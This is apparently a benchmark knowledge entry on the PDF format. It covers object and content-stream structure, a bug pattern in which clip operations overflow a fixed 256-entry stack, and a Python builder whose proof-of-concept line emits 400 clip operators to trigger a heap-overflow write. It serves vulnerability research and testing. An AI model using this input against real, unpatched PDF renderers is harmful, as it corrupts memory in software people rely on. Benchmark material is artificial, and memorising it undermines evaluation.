---
type: format-family
title: pdf format
description: Structure, build skeleton, and bug-prone areas of the pdf input format.
resource: cybergym://format/pdf
tags: [pdf]
timestamp: 2026-06-24T00:00:00Z
okf_support: 1
---
# Schema
## Identification
Adobe PDF. Starts with `%PDF-1.x`; ends with `startxref`/`%%EOF`. mupdf/pdfium/poppler are lenient
and RECONSTRUCT a broken xref, so a minimal hand-built PDF usually parses.

## Structure
- Objects: `N 0 obj … endobj`. Body dicts `<< /Key val >>`, arrays `[ … ]`, streams `<<…>>stream\n…endstream`.
- Document: Catalog → Pages → Page(s); a Page has `/Contents` (a content-stream) + `/MediaBox` + `/Resources`.
- xref table + `trailer << /Root N 0 R /Size M >>` + `startxref <offset>`.
- **Content streams** are a postfix operator language: `q`/`Q` (save/restore gstate), `re` (rect path),
  `W`/`W*` (clip), `n`/`f`/`S` (paint), `BT…ET` (text), `BDC`/`BMC`/`EMC` (marked content).

## Where bugs hide (observed)
- Content-stream operators with unbounded nesting/state. (Real pattern: each `W` clip pushed a
  CLIP_MARK into a fixed `int nest_mark[256]` field WITHOUT the bounds check that guarded the
  marked-content push; >256 clip ops overran the heap-allocated processor struct → heap-overflow WRITE.)

## How to build (raw bytes; xref optional thanks to reconstruction)
```python
def pdf(content):
    objs=[b"<</Type/Catalog/Pages 2 0 R>>", b"<</Type/Pages/Kids[3 0 R]/Count 1>>",
          b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]/Contents 4 0 R/Resources<<>>>>",
          b"<</Length %d>>stream\n"%len(content)+content+b"\nendstream"]
    out=b"%PDF-1.5\n"
    for i,o in enumerate(objs,1): out+=b"%d 0 obj"%i+o+b"endobj\n"
    return out+b"trailer<</Root 1 0 R/Size 5>>\n%%EOF"
poc = pdf(b"0 0 50 50 re W n "*400)   # >256 clip marks -> clip-stack overflow
```

## Reachability
The page must be renderable for the content stream to execute (`fz_run_page`). Keep Catalog→Pages→Page
intact and a non-empty `/Contents`.

# Examples
- Support: 1 train-set solves.
- Winning strategies (observed): {'construct': 1}
- Format families (observed): {'pdf': 1}
- Abstract sink shapes (observed): heap-buffer-overflow:WRITE

# Citations
- Distilled from train-set solves with this format + curated format knowledge.
